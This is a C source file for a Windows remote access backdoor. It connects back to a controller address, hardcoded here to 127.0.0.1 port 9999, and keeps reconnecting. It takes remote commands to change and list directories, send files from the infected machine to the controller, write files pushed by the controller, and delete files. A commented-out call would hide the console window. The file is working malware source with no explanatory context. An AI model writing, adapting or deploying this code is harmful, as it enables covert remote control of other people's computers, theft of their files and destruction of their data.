#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <unistd.h>
#include <tchar.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFSIZE MAX_PATH
#define BUFF_LEN 9000

WSADATA data;
WORD    ver;
SOCKET  sock;
SOCKADDR_IN  hint;


char err[7] = "error\n";


int wsa_soc_con(char* IP, int port)
{
    ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    sock = socket(AF_INET, SOCK_STREAM, 0);
        
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = inet_addr(IP);

    int conResult = connect(sock, (SOCKADDR*)&hint, sizeof(hint));
    
    if (conResult == SOCKET_ERROR){
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    return 0;
}

int is_file_exist(char* name) {
    FILE* fptr;

    if ((fptr = fopen(name, "rb")) == NULL) {
        return 1;
    }
    fclose(fptr);

    return 0;
}


int download_file(SOCKET sock) {
    FILE* fptr; 
    char name[BUFF_LEN];
    int bytesRecvd;

    bytesRecvd = recv(sock, name, sizeof(name), 0);
    
    if (bytesRecvd <= 0) 
    {
        return 1;
    }

    printf("filename -> %s\n", name);
    if((fptr = fopen(name, "ab")) == NULL)
    {
        printf("error");
        return 1;
    }
    
    char buffer[1];
    
    while ((bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        //bytesRecvd = recv(sock, buffer, sizeof(buffer), 0);
        
        printf("buffer -> %c\n", buffer[0]);

        fwrite(buffer, sizeof(buffer), 1, fptr);
        memset(buffer, 0, sizeof(buffer));
    }

    printf("out of loop\n");
    
    fclose(fptr);

    return 0;
}


int upload_file(char* filename, SOCKET sock) {
    FILE* fptr; 
    int read;
    char buffer[1];
    
    memset(buffer, 0, sizeof(buffer));

    if((fptr = fopen(filename, "rb")) == NULL)
    {
        printf("error");
        return 1;
    }

    send(sock, filename, strlen(filename) + 1, 0);
    Sleep(3000); 
    while (fread(buffer, sizeof(buffer), 1, fptr) > 0) {
        printf("buffer -> %c\n", buffer[0]);
        send(sock, buffer, sizeof(buffer), 0);
    }

    //send(sock, '\0', sizeof('\0'), 0);
    printf("sent file\n");

    fclose(fptr);

    return 0;
}


int ls_dir(SOCKET sock) {
    char* name;
    char store_one[BUFF_LEN];
    char send_dir[BUFF_LEN];
    int count = 0;
    int i;


    WIN32_FIND_DATA fdfile;
    HANDLE hfind;
    TCHAR Buffer[BUFSIZE];
    DWORD dwRet;

    
    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
    if( dwRet == 0 )
    {
        return 1;
    }
    name = Buffer;
    sprintf(send_dir, "\n%s: %s\n\n", "Directory", name);
    send(sock, send_dir, sizeof(send_dir), 0);
   
    char newpath[2048];
    sprintf(newpath, "%s\\*.*", name);
    
    if ((hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE){
        return 1;
    }
    
    do
    {
        if ( strcmp(fdfile.cFileName, ".") != 0 && strcmp(fdfile.cFileName, "..") != 0 ){
            sprintf(store_one, "%s\n", fdfile.cFileName);
            send(sock, store_one, sizeof(store_one), 0);
        }

    } while (FindNextFile(hfind, &fdfile));
    
    FindClose(hfind);

    return 0;
}


int get_char_len(char* in){
    int output = 0;
    for (int i = 0; in[i] != '\0'; i++, output++);

    return output;
}


int first_word(char* found, char* command){
    int size = get_char_len(found);

    if (size >= get_char_len(command) ) {
        for (int i = 0; i < size; i++) {
            if (found[i] == ' ' && command[i] == ' ' || found[i] == ' ' && command[i] == '\0'
            || found[i] == '\n' && command[i] == '\0' ) 
            {
                return 0;
            }
            else if (found[i] != command[i]) {
                return 1;
            }
        }   
    }
    else {
        return 1;
    }

    return 0;
}


void ClientSoc(char* IP , int port) {
    char buffrecv[BUFF_LEN];
    char out_msg[BUFF_LEN];
    int count = 0;
    int code = 0;
    int i;
    

    while (1) {
        //Sleep(3000);

        if (wsa_soc_con(IP, port) != 0){
            continue;
        }
        
        while (1) {

            if (code != 0) 
            {
                send(sock, err, sizeof(err), 0);
            }

            memset(buffrecv, 0, sizeof(buffrecv));
            memset(out_msg, 0, sizeof(out_msg));
            code  = 0;
            count = 0;
            int bytesRecived = recv(sock, buffrecv, sizeof(buffrecv), 0);
            printf("recv -> [%s]\n", buffrecv);

            if (bytesRecived <= 0) {
                closesocket(sock);
                WSACleanup();
                break;
            }

            if ( first_word(buffrecv, "cd") == 0 ) {
                for (i = 3; buffrecv[i] != '\0'; i++){
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';
                printf("command -> [%s]\n", out_msg);

                if( !SetCurrentDirectory(out_msg))
                {
                    printf("SetCurrentDirectory failed (%d)\n", GetLastError());
                    send(sock, err, sizeof(err), 0);
                } 
                else 
                {
                    send(sock, "changed dir", sizeof("changed dir"), 0);
                }

            } 
            else if ( strcmp(buffrecv, "dir\n") == 0 || strcmp(buffrecv, "ls\n") == 0 ) {
                printf("\n\n\n dir \n\n\n");
                code = ls_dir(sock);
                closesocket(sock);
                WSACleanup();
                wsa_soc_con(IP, port);
                continue;
            }
            else if ( first_word(buffrecv, "pwd") == 0 ) {
                printf("\n\n\n pwd \n\n\n");
                TCHAR Buffer[BUFSIZE];
                DWORD dwRet;

                dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
                if( dwRet == 0 )
                {
                    sprintf(out_msg, "Path\n-----\n%s\n", Buffer);
                    send(sock, out_msg, sizeof(out_msg), 0);
                }
                else
                {
                    send(sock, err, sizeof(err), 0);
                    printf("dwRet error ->  %s\n", GetLastError());
                };
            }
            else if (first_word(buffrecv, "download_file") == 0) {
                printf("download_file_0\n");
                for (i = 14; buffrecv[i] != '\0'; i++)
                {
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                printf("out_msg -> %s\n", out_msg);

                if ( is_file_exist(out_msg) == 0 ) {
                    upload_file(out_msg, sock);
                    closesocket(sock);
                }
                else
                {
                    closesocket(sock);
                }
                WSACleanup();
                wsa_soc_con(IP, port);
            }
            else if ( first_word(buffrecv, "upload_file") == 0 ) {
                printf("upload_file_0\n");
                code = download_file(sock);
                printf("out_func_download_file_1\n");
                
                WSACleanup();
                wsa_soc_con(IP, port);
            }
            else if ( first_word(buffrecv, "del") == 0 ) {
                for (i = 4; buffrecv[i] != '\0'; i++)
                {
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                code = DeleteFile(out_msg);

                printf("out_msg -> [%s]\n", out_msg);
                
                if ( code != 0 ) 
                {
                    send(sock, "file deleted", sizeof("file deleted"), 0);
                }
                else
                {
                    send(sock, err, sizeof(err), 0);
                }
            }
            else
            {
                send(sock, "command", sizeof("command"), 0);
            }
        }
    }
}


int main(){
    //FreeConsole();
    ClientSoc("127.0.0.1", 9999);
    return 0;
}